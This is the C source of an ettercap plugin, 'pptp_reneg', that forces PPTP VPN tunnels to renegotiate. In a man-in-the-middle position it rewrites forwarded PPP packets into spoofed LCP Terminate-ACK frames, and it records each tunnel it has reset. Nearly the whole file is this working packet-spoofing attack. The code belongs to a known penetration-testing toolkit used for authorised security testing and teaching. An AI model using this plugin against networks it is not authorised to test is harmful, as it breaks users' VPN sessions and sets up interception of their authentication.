/*
    pptp_reneg -- ettercap plugin -- Forces re-negotiation on an existing PPTP tunnel

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>

struct ppp_header {
   u_char  address;
   u_char  control;
   u_int16 proto;
};

struct ppp_lcp_header {
   u_char  code;
   u_char  ident;
   u_int16 length;
};
#define PPP_TERMINATE_ACK       0x06
#define PPP_PROTO_LCP           0xc021

/* Remember what tunnels we have terminated */
struct call_list {
   struct ip_addr ip[2];
   SLIST_ENTRY(call_list) next;
};

SLIST_HEAD(, call_list) call_table;

/* protos */
int plugin_load(void *);
static int pptp_reneg_init(void *);
static int pptp_reneg_fini(void *);

static void parse_ppp(struct packet_object *po);
static int found_in_list(struct packet_object *po);

/* plugin operations */
struct plugin_ops pptp_reneg_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "pptp_reneg",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "PPTP: Forces tunnel re-negotiation",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &pptp_reneg_init,
   /* deactivation function */                     
   .fini =              &pptp_reneg_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &pptp_reneg_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int pptp_reneg_init(void *dummy) 
{
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("pptp_reneg: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }

   USER_MSG("pptp_reneg: plugin running...\n");
   
   hook_add(HOOK_PACKET_PPP, &parse_ppp);
   return PLUGIN_RUNNING;   
}


static int pptp_reneg_fini(void *dummy) 
{
   struct call_list *p;

   USER_MSG("pptp_reneg: plugin terminated...\n");

   hook_del(HOOK_PACKET_PPP, &parse_ppp);

   /* delete terminated tunnel list */
   while (!SLIST_EMPTY(&call_table)) {
      p = SLIST_FIRST(&call_table);
      SLIST_REMOVE_HEAD(&call_table, next);
      SAFE_FREE(p);
   }

   return PLUGIN_FINISHED;
}

/*********************************************************/

/* Force renegotiation by spoofing a Terminate-ACK */
static void parse_ppp(struct packet_object *po)
{
   struct ppp_lcp_header *lcp;
   struct ppp_header *ppp;
   char tmp[MAX_ASCII_ADDR_LEN];
   
   /* It is pointless to modify packets that won't be forwarded */
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 

   /* Do not terminate same tunnel twice */
   if (found_in_list(po))
      return;
      
   ppp = (struct ppp_header *)po->L4.header;
   lcp = (struct ppp_lcp_header *)(ppp + 1);

   /* We assume a new connection...so no reset */
   if (ppp->proto == ntohs(PPP_PROTO_LCP))
      return;

   /* Change the packet into a Terminate-ACK */
   ppp->proto = htons(PPP_PROTO_LCP);
   ppp->address = 0xff;
   ppp->control = 0x3;

   lcp->code = PPP_TERMINATE_ACK;      
   lcp->ident = 0x01; /* or a higher value */
   lcp->length = htons(sizeof(*lcp));

   /* Notify the changes to previous decoders */
   po->flags |= PO_MODIFIED; 
   /* Use DATA.delta to notify ppp packet len modification */ 
   po->DATA.delta = sizeof(struct ppp_lcp_header) + sizeof(struct ppp_header) - po->L4.len;

   USER_MSG("pptp_reneg: Forced tunnel re-negotiation  %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
   USER_MSG("%s\n", ip_addr_ntoa(&po->L3.dst, tmp));
}


/* Check if we already terminated this tunnel once */
static int found_in_list(struct packet_object *po)
{
   struct call_list *p;
   
   /* Check if the addresses are consistent */
   if (ip_addr_null(&po->L3.dst) || ip_addr_null(&po->L3.src))
      return 1;
      
   /* Check if we already terminated this tunnel once */
   SLIST_FOREACH(p, &call_table, next) {
      if ( (!ip_addr_cmp(&po->L3.src, &p->ip[0]) && 
            !ip_addr_cmp(&po->L3.dst, &p->ip[1])) || 
           (!ip_addr_cmp(&po->L3.src, &p->ip[1]) && 
            !ip_addr_cmp(&po->L3.dst, &p->ip[0])) )
         return 1;
   }

   SAFE_CALLOC(p, 1, sizeof(struct call_list));
   memcpy (&(p->ip[0]), &po->L3.src, sizeof(struct ip_addr));
   memcpy (&(p->ip[1]), &po->L3.dst, sizeof(struct ip_addr));
   
   SLIST_INSERT_HEAD(&call_table, p, next);

   return 0;      
}

/* EOF */

// vim:ts=3:expandtab
 
